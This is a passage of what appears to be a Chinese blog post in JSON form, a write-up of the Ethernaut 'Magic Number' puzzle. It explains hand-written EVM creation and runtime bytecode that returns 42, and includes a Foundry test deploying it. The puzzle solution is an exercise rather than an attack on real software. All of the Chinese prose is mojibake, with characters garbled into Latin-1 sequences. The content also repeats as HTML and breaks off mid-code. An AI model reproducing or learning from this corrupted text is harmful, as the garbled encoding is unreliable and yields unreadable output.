æ­¤ï¼Œæˆ‘ä»¬å¿…é¡»æ‰‹åŠ¨ç¼–å†™EVMå­—èŠ‚ç ã€‚æˆ‘ä»¬éœ€è¦åˆ†åˆ«æ„å»ºä¸¤éƒ¨åˆ†ä»£ç ï¼š\n\n1.  **è¿è¡Œæ—¶ä»£ç  (Runtime Code)**: è¿™æ˜¯æœ€ç»ˆå­˜å‚¨åœ¨é“¾ä¸Šçš„ä»£ç ï¼Œè´Ÿè´£åœ¨è¢«è°ƒç”¨æ—¶è¿”å›42ã€‚è¿™éƒ¨åˆ†ä»£ç çš„é•¿åº¦å¿…é¡»å°äºç­‰äº10å­—èŠ‚ã€‚\n2.  **åˆ›å»ºä»£ç  (Creation Code)**: è¿™æ˜¯éƒ¨ç½²åˆçº¦æ—¶æ‰§è¡Œçš„ä»£ç ã€‚å®ƒçš„ä»»åŠ¡åªæœ‰ä¸€ä¸ªï¼šå°†è¿è¡Œæ—¶ä»£ç è¿”å›ï¼Œä»¥ä¾¿EVMå°†å…¶å­˜å‚¨ä¸ºæ–°åˆçº¦çš„ä»£ç ã€‚\n\n### 1. æ„å»ºè¿è¡Œæ—¶ä»£ç  (Runtime Code)\n\næˆ‘ä»¬çš„è¿è¡Œæ—¶ä»£ç éœ€è¦åšä¸¤ä»¶äº‹ï¼š\n1.  å°†æ•°å­— `42` (åå…­è¿›åˆ¶ä¸º `0x2a`) æ”¾å…¥å†…å­˜ã€‚\n2.  ä»å†…å­˜ä¸­è¿”å›è¿™ä¸ªæ•°å­—ã€‚\n\nè¿™éœ€è¦ä»¥ä¸‹æ“ä½œç ï¼ˆOpcodesï¼‰ï¼š\n\n| Opcode | åç§°   | ä½œç”¨                               |\n| :----- | :----- | :--------------------------------- |\n| `0x60` | `PUSH1`| å°†1ä¸ªå­—èŠ‚çš„æ•°æ®å‹å…¥å †æ ˆã€‚          |\n| `0x52` | `MSTORE`| `MSTORE(p, v)`: å°†å€¼ `v` å­˜å…¥å†…å­˜åœ°å€ `p`ã€‚ |\n| `0xf3` | `RETURN`| `RETURN(p, s)`: ä»å†…å­˜åœ°å€ `p` å¼€å§‹ï¼Œè¿”å› `s` å­—èŠ‚çš„æ•°æ®ã€‚ |\n\næ‰§è¡Œæ­¥éª¤å¦‚ä¸‹ï¼š\n1.  `PUSH1 0x2a`: å°† `42` å‹å…¥å †æ ˆã€‚\n2.  `PUSH1 0x80`: å°†å†…å­˜åœ°å€ `0x80` å‹å…¥å †æ ˆã€‚ï¼ˆ`0x80` æ˜¯Solidityä¸­è‡ªç”±å†…å­˜æŒ‡é’ˆçš„èµ·å§‹ä½ç½®ï¼Œä½¿ç”¨å®ƒæ˜¯æƒ¯ä¾‹ï¼‰ã€‚\n3.  `MSTORE`: `mstore(0x80, 0x2a)`ï¼Œå°† `42` å­˜å…¥å†…å­˜ã€‚\n4.  `PUSH1 0x20`: å°†è¿”å›å€¼å¤§å° `32` å­—èŠ‚ï¼ˆä¸€ä¸ª `uint256`ï¼‰å‹å…¥å †æ ˆã€‚\n5.  `PUSH1 0x80`: å°†è¿”å›çš„å†…å­˜åœ°å€ `0x80` å‹å…¥å †æ ˆã€‚\n6.  `RETURN`: `return(0x80, 0x20)`ï¼Œè¿”å›ç»“æœã€‚\n\nå°†è¿™äº›æ­¥éª¤è½¬æ¢ä¸ºå­—èŠ‚ç ï¼š\n`602a` `6080` `52` `6020` `6080` `f3`\n\nè¿™ä¸ªå­—èŠ‚ç çš„é•¿åº¦æ˜¯10å­—èŠ‚ï¼š`0x602a60805260206080f3`ã€‚å®Œç¾ç¬¦åˆè¦æ±‚ï¼\n\n### 2. æ„å»ºåˆ›å»ºä»£ç  (Creation Code)\n\nåˆ›å»ºä»£ç çš„ä»»åŠ¡æ˜¯å°†ä¸Šé¢çš„10å­—èŠ‚è¿è¡Œæ—¶ä»£ç è¿”å›ç»™EVMã€‚å®ƒéœ€è¦åšä¸¤ä»¶äº‹ï¼š\n1.  å°†è¿è¡Œæ—¶ä»£ç ä»åˆ›å»ºä»£ç çš„æœ«å°¾å¤åˆ¶åˆ°å†…å­˜ä¸­ã€‚\n2.  ä»å†…å­˜ä¸­è¿”å›è¿™æ®µè¿è¡Œæ—¶ä»£ç ã€‚\n\nè¿™éœ€è¦ `CODECOPY` æ“ä½œç ï¼š\n\n| Opcode | åç§°     | ä½œç”¨                               |\n| :----- | :------- | :--------------------------------- |\n| `0x39` | `CODECOPY`| `CODECOPY(d, p, s)`: ä»ä»£ç çš„ `p` ä½ç½®å¼€å§‹ï¼Œå¤åˆ¶ `s` å­—èŠ‚åˆ°å†…å­˜çš„ `d` ä½ç½®ã€‚ |\n\næ‰§è¡Œæ­¥éª¤å¦‚ä¸‹ï¼š\n1.  å°†è¿è¡Œæ—¶ä»£ç å¤åˆ¶åˆ°å†…å­˜ `0x00` å¤„ã€‚\n2.  ä»å†…å­˜ `0x00` å¤„è¿”å›10å­—èŠ‚çš„ä»£ç ã€‚\n\nå­—èŠ‚ç å¦‚ä¸‹ï¼š\n-   `600a`: `PUSH1 0x0a` (è¿è¡Œæ—¶ä»£ç é•¿åº¦: 10å­—èŠ‚)\n-   `600c`: `PUSH1 0x0c` (è¿è¡Œæ—¶ä»£ç åœ¨åˆ›å»ºä»£ç ä¸­çš„èµ·å§‹ä½ç½®: ç¬¬12å­—èŠ‚)\n-   `6000`: `PUSH1 0x00` (ç›®æ ‡å†…å­˜åœ°å€: 0)\n-   `39`: `CODECOPY`\n-   `600a`: `PUSH1 0x0a` (è¦è¿”å›çš„æ•°æ®é•¿åº¦: 10å­—èŠ‚)\n-   `6000`: `PUSH1 0x00` (è¦è¿”å›çš„å†…å­˜åœ°å€: 0)\n-   `f3`: `RETURN`\n\nåˆ›å»ºä»£ç ä¸º: `0x600a600c600039600a6000f3`ã€‚å®ƒçš„é•¿åº¦æ˜¯12å­—èŠ‚ã€‚\n\n### 3. ç»„åˆæœ€ç»ˆå­—èŠ‚ç \n\næœ€ç»ˆéƒ¨ç½²çš„å­—èŠ‚ç æ˜¯ **åˆ›å»ºä»£ç  + è¿è¡Œæ—¶ä»£ç **ï¼š\n`0x600a600c600039600a6000f3` + `602a60805260206080f3`\n\næœ€ç»ˆå­—èŠ‚ç : `0x600a600c600039600a6000f3602a60805260206080f3`\n\n## ğŸ’» Foundry å®ç°\n\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Foundry çš„å†…è”æ±‡ç¼–å’Œ `create` æ“ä½œç æ¥éƒ¨ç½²è¿™æ®µå­—èŠ‚ç ã€‚\n\n### Foundry æµ‹è¯•ä»£ç \n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/18_MagicNumber.sol\";\n\ninterface ISolver {\n    function whatIsTheMeaningOfLife() external view returns (uint256);\n}\n\ncontract MagicNumberTest is Test {\n    MagicNum instance;\n    Attack attack;\n    address player;\n\n    function setUp() public {\n        player = vm.addr(1);\n        attack = new Attack();\n        instance = new MagicNum();\n    }\n\n    function testAttacker() public {\n        // éƒ¨ç½²æˆ‘ä»¬çš„æ‰‹å†™å­—èŠ‚ç åˆçº¦\n        address solverAddress = attack.deploySolver();\n        instance.setSolver(solverAddress);\n\n        // éªŒè¯è¿”å›å€¼æ˜¯å¦ä¸º 42\n        assertEq(ISolver(solverAddress).whatIsTheMeaningOfLife(), 42);\n\n        // éªŒè¯å­—èŠ‚ç é•¿åº¦æ˜¯å¦ä¸º 10\n        uint256 size;\n        assembly {\n            size := extcodesize(solverAddress)\n        }\n        assertEq(size, 10);\n    }\n}\n\ncontract Attack {\n    function deploySolver() public returns (address) {\n        address solver;\n        // æœ€ç»ˆçš„éƒ¨ç½²å­—èŠ‚ç \n        bytes memory bytecode = hex\"600a600c600039600a6000f3602a60805260206080f3\";\n        \n        assembly {\n            // create(v, p, s): éƒ¨ç½²åˆçº¦\n            // v: å‘é€çš„ ether å€¼ (0)\n            // p: å­—èŠ‚ç åœ¨å†…å­˜ä¸­çš„ä½ç½® (bytecode + 0x20)\n            // s: å­—èŠ‚ç çš„é•¿åº¦ (mload(bytecode))\n            solver := create(0, add(bytecode, 0x20), mload(bytecode))\n        }\n        return solver;\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1.  **è®¾è®¡è¿è¡Œæ—¶ä»£ç **: ç²¾å¿ƒè®¾è®¡ä¸€æ®µä¸è¶…è¿‡10å­—èŠ‚çš„ä»£ç ï¼Œä½¿å…¶èƒ½å¤Ÿè¿”å› `42`ã€‚\n2.  **è®¾è®¡åˆ›å»ºä»£ç **: è®¾è®¡ä¸€æ®µä»£ç ï¼Œå…¶åŠŸèƒ½æ˜¯è¿”å›ç¬¬ä¸€æ­¥ä¸­è®¾è®¡çš„è¿è¡Œæ—¶ä»£ç ã€‚\n3.  **ç»„åˆå­—èŠ‚ç **: å°†åˆ›å»ºä»£ç å’Œè¿è¡Œæ—¶ä»£ç æ‹¼æ¥æˆæœ€ç»ˆçš„éƒ¨ç½²å­—èŠ‚ç ã€‚\n4.  **éƒ¨ç½²**: ä½¿ç”¨ `create` æ“ä½œç ï¼ˆå¯ä»¥é€šè¿‡å†…è”æ±‡ç¼–æˆ–å‘é€è£¸äº¤æ˜“ï¼‰æ¥éƒ¨ç½²è¿™æ®µå­—èŠ‚ç ï¼Œå¾—åˆ°æ±‚è§£å™¨åˆçº¦çš„åœ°å€ã€‚\n5.  **æäº¤**: å°†æ±‚è§£å™¨åˆçº¦çš„åœ°å€æäº¤ç»™ `Ethernaut` å…³å¡ã€‚\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\nè¿™ä¸ªå…³å¡æœ¬èº«ä¸æ˜¯ä¸€ä¸ªæ¼æ´ï¼Œè€Œæ˜¯ä¸€ä¸ªEVMç¼–ç¨‹çš„ç»ƒä¹ ã€‚ç„¶è€Œï¼Œå®ƒæ­ç¤ºäº†åœ¨è¿›è¡Œå­—èŠ‚ç çº§åˆ«çš„å®¡è®¡æ—¶éœ€è¦æ³¨æ„çš„äº‹é¡¹ï¼š\n\n-   **ç†è§£åº•å±‚æ“ä½œ**: ä»…ä»…å®¡è®¡Solidityä»£ç å¯èƒ½ä¸è¶³ä»¥å‘ç°æ‰€æœ‰é—®é¢˜ã€‚å¯¹äºé«˜åº¦ä¼˜åŒ–çš„æˆ–ä½¿ç”¨å†…è”æ±‡ç¼–çš„åˆçº¦ï¼Œå¿…é¡»ç†è§£å…¶ç”Ÿæˆçš„EVMæ“ä½œç çš„å®é™…è¡Œä¸ºã€‚\n-   **è­¦æƒ•ä¸å¯»å¸¸çš„éƒ¨ç½²æ¨¡å¼**: å¦‚æœä¸€ä¸ªåˆçº¦çš„åˆ›å»ºè¿‡ç¨‹ä¸æ ‡å‡†ï¼ˆä¾‹å¦‚ï¼Œä½¿ç”¨è£¸ `create` æˆ– `create2`ï¼‰ï¼Œéœ€è¦ç‰¹åˆ«å®¡æŸ¥å…¶å­—èŠ‚ç çš„æ¥æºå’ŒåŠŸèƒ½ã€‚\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n-   **EVM Opcodes**: EVMçš„æ“ä½œç æ˜¯å…¶æ‰§è¡Œæ‰€æœ‰è®¡ç®—çš„åŸºç¡€ã€‚`evm.codes` æ˜¯ä¸€ä¸ªæå¥½çš„äº¤äº’å¼å‚è€ƒç½‘ç«™ã€‚\n-   **å†…è”æ±‡ç¼– (`assembly`)**: Solidityå…è®¸åœ¨ä»£ç ä¸­ç›´æ¥åµŒå…¥æ±‡ç¼–è¯­è¨€ï¼Œæä¾›äº†å¯¹EVMæ›´åº•å±‚çš„æ§åˆ¶ï¼Œä½†åŒæ—¶ä¹Ÿå¸¦æ¥äº†æ›´å¤§çš„é£é™©å’Œå¤æ‚æ€§ã€‚\n-   **`create` æ“ä½œç **: ç”¨äºä»ä»£ç ä¸­éƒ¨ç½²æ–°åˆçº¦ã€‚\n-   **`extcodesize` æ“ä½œç **: ç”¨äºè·å–ä¸€ä¸ªåœ°å€ä¸Šçš„ä»£ç å¤§å°ã€‚\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n-   åˆçº¦çš„å­—èŠ‚ç åˆ†ä¸º `creation code` å’Œ `runtime code`ã€‚\n-   `creation code` åœ¨éƒ¨ç½²æ—¶æ‰§è¡Œä¸€æ¬¡ï¼Œå…¶è¿”å›å€¼æ˜¯ `runtime code`ã€‚\n-   `runtime code` æ˜¯æ°¸ä¹…å­˜å‚¨åœ¨é“¾ä¸Šçš„ä»£ç ï¼Œå“åº”å¤–éƒ¨è°ƒç”¨ã€‚\n-   é€šè¿‡ç›´æ¥æ“ä½œEVMæ“ä½œç ï¼Œå¯ä»¥åˆ›å»ºå‡ºéå¸¸ç´§å‡‘å’Œé«˜æ•ˆçš„åˆçº¦ã€‚\n\n**æ”»å‡»å‘é‡**:\n-   é€šè¿‡æ‰‹å†™æ±‡ç¼–ï¼Œç»•è¿‡é«˜çº§è¯­è¨€çš„é™åˆ¶ï¼ˆå¦‚æœ¬ä¾‹ä¸­çš„ä»£ç å¤§å°é™åˆ¶ï¼‰ã€‚\n\n**é˜²å¾¡ç­–ç•¥**:\n-   åœ¨å®‰å…¨å®¡è®¡ä¸­ï¼Œä¸èƒ½å¿½è§†å¯¹åº•å±‚å­—èŠ‚ç å’Œæ±‡ç¼–çš„åˆ†æï¼Œç‰¹åˆ«æ˜¯å½“åˆçº¦è¡Œä¸ºä¸å¯»å¸¸æ—¶ã€‚\n\n## ğŸ“š å‚è€ƒèµ„æ–™\n\n-   [EVM Codes - An Interactive Reference](https://www.evm.codes/)\n-   [Deconstructing a Solidity Contract](https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737)\n-   [Solidity Docs: Inline Assembly](https://docs.soliditylang.org/en/latest/assembly.html)","slug":"ethernaut-level-18-magic-number","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpg001cbf5qdh9ngvlv","content":"<h1 id=\"ğŸ¯-Ethernaut-Level-18-Magic-Number-æ‰‹å†™EVMå­—èŠ‚ç \"><a href=\"#ğŸ¯-Ethernaut-Level-18-Magic-Number-æ‰‹å†™EVMå­—èŠ‚ç \" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 18: Magic Number - æ‰‹å†™EVMå­—èŠ‚ç \"></a>ğŸ¯ Ethernaut Level 18: Magic Number - æ‰‹å†™EVMå­—èŠ‚ç </h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/18\">Ethernaut Level 18 - Magic Number</a><br><strong>æ”»å‡»ç±»å‹</strong>: EVMå­—èŠ‚ç ç¼–å†™<br><strong>éš¾åº¦</strong>: â­â­â­â­â­</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>ä½ éœ€è¦éƒ¨ç½²ä¸€ä¸ªåˆçº¦ï¼Œå®ƒå¿…é¡»æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š</p>\n<ol>\n<li>å®ƒçš„è¿è¡Œæ—¶å­—èŠ‚ç ï¼ˆ<code>runtime bytecode</code>ï¼‰å¤§å°ä¸èƒ½è¶…è¿‡10ä¸ªå­—èŠ‚ã€‚</li>\n<li>å½“è°ƒç”¨å®ƒçš„ <code>whatIsTheMeaningOfLife()</code> å‡½æ•°æ—¶ï¼Œå¿…é¡»è¿”å› <code>42</code>ã€‚</li>\n</ol>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel18.svg\" alt=\"Magic Number Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><p>è¿™ä¸ªæŒ‘æˆ˜å°†æˆ‘ä»¬å¸¦å…¥EVMçš„åº•å±‚ã€‚ä½¿ç”¨Solidityç¼–å†™ä¸€ä¸ªè¿”å›42çš„å‡½æ•°éå¸¸ç®€å•ï¼Œä½†ç¼–è¯‘åçš„å­—èŠ‚ç ä¼šè¿œè¿œè¶…è¿‡10å­—èŠ‚çš„é™åˆ¶ï¼Œå› ä¸ºå®ƒåŒ…å«äº†å‡½æ•°è°ƒåº¦å™¨ã€å®‰å…¨æ£€æŸ¥ç­‰å¤§é‡é¢å¤–ä»£ç ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ç¼–è¯‘åå­—èŠ‚ç ä¼šå¾ˆé•¿ï¼Œæ— æ³•é€šè¿‡å…³å¡</span><br><span class=\"line\">contract NormalSolver &#123;</span><br><span class=\"line\">    function whatIsTheMeaningOfLife() public pure returns (uint256) &#123;</span><br><span class=\"line\">        return 42;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>å› æ­¤ï¼Œæˆ‘ä»¬å¿…é¡»æ‰‹åŠ¨ç¼–å†™EVMå­—èŠ‚ç ã€‚æˆ‘ä»¬éœ€è¦åˆ†åˆ«æ„å»ºä¸¤éƒ¨åˆ†ä»£ç ï¼š</p>\n<ol>\n<li><strong>è¿è¡Œæ—¶ä»£ç  (Runtime Code)</strong>: è¿™æ˜¯æœ€ç»ˆå­˜å‚¨åœ¨é“¾ä¸Šçš„ä»£ç ï¼Œè´Ÿè´£åœ¨è¢«è°ƒç”¨æ—¶è¿”å›42ã€‚è¿™éƒ¨åˆ†ä»£ç çš„é•¿åº¦å¿…é¡»å°äºç­‰äº10å­—èŠ‚ã€‚</li>\n<li><strong>åˆ›å»ºä»£ç  (Creation Code)</strong>: è¿™æ˜¯éƒ¨ç½²åˆçº¦æ—¶æ‰§è¡Œçš„ä»£ç ã€‚å®ƒçš„ä»»åŠ¡åªæœ‰ä¸€ä¸ªï¼šå°†è¿è¡Œæ—¶ä»£ç è¿”å›ï¼Œä»¥ä¾¿EVMå°†å…¶å­˜å‚¨ä¸ºæ–°åˆçº¦çš„ä»£ç ã€‚</li>\n</ol>\n<h3 id=\"1-æ„å»ºè¿è¡Œæ—¶ä»£ç -Runtime-Code\"><a href=\"#1-æ„å»ºè¿è¡Œæ—¶ä»£ç -Runtime-Code\" class=\"headerlink\" title=\"1. æ„å»ºè¿è¡Œæ—¶ä»£ç  (Runtime Code)\"></a>1. æ„å»ºè¿è¡Œæ—¶ä»£ç  (Runtime Code)</h3><p>æˆ‘ä»¬çš„è¿è¡Œæ—¶ä»£ç éœ€è¦åšä¸¤ä»¶äº‹ï¼š</p>\n<ol>\n<li>å°†æ•°å­— <code>42</code> (åå…­è¿›åˆ¶ä¸º <code>0x2a</code>) æ”¾å…¥å†…å­˜ã€‚</li>\n<li>ä»å†…å­˜ä¸­è¿”å›è¿™ä¸ªæ•°å­—ã€‚</li>\n</ol>\n<p>è¿™éœ€è¦ä»¥ä¸‹æ“ä½œç ï¼ˆOpcodesï¼‰ï¼š</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">Opcode</th>\n<th align=\"left\">åç§°</th>\n<th align=\"left\">ä½œç”¨</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"><code>0x60</code></td>\n<td align=\"left\"><code>PUSH1</code></td>\n<td align=\"left\">å°†1ä¸ªå­—èŠ‚çš„æ•°æ®å‹å…¥å †æ ˆã€‚</td>\n</tr>\n<tr>\n<td align=\"left\"><code>0x52</code></td>\n<td align=\"left\"><code>MSTORE</code></td>\n<td align=\"left\"><code>MSTORE(p, v)</code>: å°†å€¼ <code>v</code> å­˜å…¥å†…å­˜åœ°å€ <code>p</code>ã€‚</td>\n</tr>\n<tr>\n<td align=\"left\"><code>0xf3</code></td>\n<td align=\"left\"><code>RETURN</code></td>\n<td align=\"left\"><code>RETURN(p, s)</code>: ä»å†…å­˜åœ°å€ <code>p</code> å¼€å§‹ï¼Œè¿”å› <code>s</code> å­—èŠ‚çš„æ•°æ®ã€‚</td>\n</tr>\n</tbody></table>\n<p>æ‰§è¡Œæ­¥éª¤å¦‚ä¸‹ï¼š</p>\n<ol>\n<li><code>PUSH1 0x2a</code>: å°† <code>42</code> å‹å…¥å †æ ˆã€‚</li>\n<li><code>PUSH1 0x80</code>: å°†å†…å­˜åœ°å€ <code>0x80</code> å‹å…¥å †æ ˆã€‚ï¼ˆ<code>0x80</code> æ˜¯Solidityä¸­è‡ªç”±å†…å­˜æŒ‡é’ˆçš„èµ·å§‹ä½ç½®ï¼Œä½¿ç”¨å®ƒæ˜¯æƒ¯ä¾‹ï¼‰ã€‚</li>\n<li><code>MSTORE</code>: <code>mstore(0x80, 0x2a)</code>ï¼Œå°† <code>42</code> å­˜å…¥å†…å­˜ã€‚</li>\n<li><code>PUSH1 0x20</code>: å°†è¿”å›å€¼å¤§å° <code>32</code> å­—èŠ‚ï¼ˆä¸€ä¸ª <code>uint256</code>ï¼‰å‹å…¥å †æ ˆã€‚</li>\n<li><code>PUSH1 0x80</code>: å°†è¿”å›çš„å†…å­˜åœ°å€ <code>0x80</code> å‹å…¥å †æ ˆã€‚</li>\n<li><code>RETURN</code>: <code>return(0x80, 0x20)</code>ï¼Œè¿”å›ç»“æœã€‚</li>\n</ol>\n<p>å°†è¿™äº›æ­¥éª¤è½¬æ¢ä¸ºå­—èŠ‚ç ï¼š<br><code>602a</code> <code>6080</code> <code>52</code> <code>6020</code> <code>6080</code> <code>f3</code></p>\n<p>è¿™ä¸ªå­—èŠ‚ç çš„é•¿åº¦æ˜¯10å­—èŠ‚ï¼š<code>0x602a60805260206080f3</code>ã€‚å®Œç¾ç¬¦åˆè¦æ±‚ï¼</p>\n<h3 id=\"2-æ„å»ºåˆ›å»ºä»£ç -Creation-Code\"><a href=\"#2-æ„å»ºåˆ›å»ºä»£ç -Creation-Code\" class=\"headerlink\" title=\"2. æ„å»ºåˆ›å»ºä»£ç  (Creation Code)\"></a>2. æ„å»ºåˆ›å»ºä»£ç  (Creation Code)</h3><p>åˆ›å»ºä»£ç çš„ä»»åŠ¡æ˜¯å°†ä¸Šé¢çš„10å­—èŠ‚è¿è¡Œæ—¶ä»£ç è¿”å›ç»™EVMã€‚å®ƒéœ€è¦åšä¸¤ä»¶äº‹ï¼š</p>\n<ol>\n<li>å°†è¿è¡Œæ—¶ä»£ç ä»åˆ›å»ºä»£ç çš„æœ«å°¾å¤åˆ¶åˆ°å†…å­˜ä¸­ã€‚</li>\n<li>ä»å†…å­˜ä¸­è¿”å›è¿™æ®µè¿è¡Œæ—¶ä»£ç ã€‚</li>\n</ol>\n<p>è¿™éœ€è¦ <code>CODECOPY</code> æ“ä½œç ï¼š</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">Opcode</th>\n<th align=\"left\">åç§°</th>\n<th align=\"left\">ä½œç”¨</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"><code>0x39</code></td>\n<td align=\"left\"><code>CODECOPY</code></td>\n<td align=\"left\"><code>CODECOPY(d, p, s)</code>: ä»ä»£ç çš„ <code>p</code> ä½ç½®å¼€å§‹ï¼Œå¤åˆ¶ <code>s</code> å­—èŠ‚åˆ°å†…å­˜çš„ <code>d</code> ä½ç½®ã€‚</td>\n</tr>\n</tbody></table>\n<p>æ‰§è¡Œæ­¥éª¤å¦‚ä¸‹ï¼š</p>\n<ol>\n<li>å°†è¿è¡Œæ—¶ä»£ç å¤åˆ¶åˆ°å†…å­˜ <code>0x00</code> å¤„ã€‚</li>\n<li>ä»å†…å­˜ <code>0x00</code> å¤„è¿”å›10å­—èŠ‚çš„ä»£ç ã€‚</li>\n</ol>\n<p>å­—èŠ‚ç å¦‚ä¸‹ï¼š</p>\n<ul>\n<li><code>600a</code>: <code>PUSH1 0x0a</code> (è¿è¡Œæ—¶ä»£ç é•¿åº¦: 10å­—èŠ‚)</li>\n<li><code>600c</code>: <code>PUSH1 0x0c</code> (è¿è¡Œæ—¶ä»£ç åœ¨åˆ›å»ºä»£ç ä¸­çš„èµ·å§‹ä½ç½®: ç¬¬12å­—èŠ‚)</li>\n<li><code>6000</code>: <code>PUSH1 0x00</code> (ç›®æ ‡å†…å­˜åœ°å€: 0)</li>\n<li><code>39</code>: <code>CODECOPY</code></li>\n<li><code>600a</code>: <code>PUSH1 0x0a</code> (è¦è¿”å›çš„æ•°æ®é•¿åº¦: 10å­—èŠ‚)</li>\n<li><code>6000</code>: <code>PUSH1 0x00</code> (è¦è¿”å›çš„å†…å­˜åœ°å€: 0)</li>\n<li><code>f3</code>: <code>RETURN</code></li>\n</ul>\n<p>åˆ›å»ºä»£ç ä¸º: <code>0x600a600c600039600a6000f3</code>ã€‚å®ƒçš„é•¿åº¦æ˜¯12å­—èŠ‚ã€‚</p>\n<h3 id=\"3-ç»„åˆæœ€ç»ˆå­—èŠ‚ç \"><a href=\"#3-ç»„åˆæœ€ç»ˆå­—èŠ‚ç \" class=\"headerlink\" title=\"3. ç»„åˆæœ€ç»ˆå­—èŠ‚ç \"></a>3. ç»„åˆæœ€ç»ˆå­—èŠ‚ç </h3><p>æœ€ç»ˆéƒ¨ç½²çš„å­—èŠ‚ç æ˜¯ <strong>åˆ›å»ºä»£ç  + è¿è¡Œæ—¶ä»£ç </strong>ï¼š<br><code>0x600a600c600039600a6000f3</code> + <code>602a60805260206080f3</code></p>\n<p>æœ€ç»ˆå­—èŠ‚ç : <code>0x600a600c600039600a6000f3602a60805260206080f3</code></p>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Foundry çš„å†…è”æ±‡ç¼–å’Œ <code>create</code> æ“ä½œç æ¥éƒ¨ç½²è¿™æ®µå­—èŠ‚ç ã€‚</p>\n<h3 id=\"Foundry-æµ‹è¯•ä»£ç \"><a href=\"#Foundry-æµ‹è¯•ä»£ç \" class=\"headerlink\" title=\"Foundry æµ‹è¯•ä»£ç \"></a>Foundry æµ‹è¯•ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/18_MagicNumber.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">interface ISolver &#123;</span><br><span class=\"line\">    function whatIsTheMeaningOfLife() external view returns (uint256);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract MagicNumberTest is Test &#123;</span><br><span class=\"line\">    MagicNum instance;</span><br><span class=\"line\">    Attack attack;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\">        attack = new Attack();</span><br><span class=\"line\">        instance = new MagicNum();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testAttacker() public &#123;</span><br><span class=\"line\">        // éƒ¨ç½²æˆ‘ä»¬çš„æ‰‹å†™å­—èŠ‚ç åˆçº¦</span><br><span class=\"line\">        address solverAddress = attack.deploySolver();</span><br><span class=\"line\">        instance.setSolver(solverAddress);</span><br><span class=\"line\"></span><br><span class=\"line\">        // éªŒè¯è¿”å›å€¼æ˜¯å¦ä¸º 42</span><br><span class=\"line\">        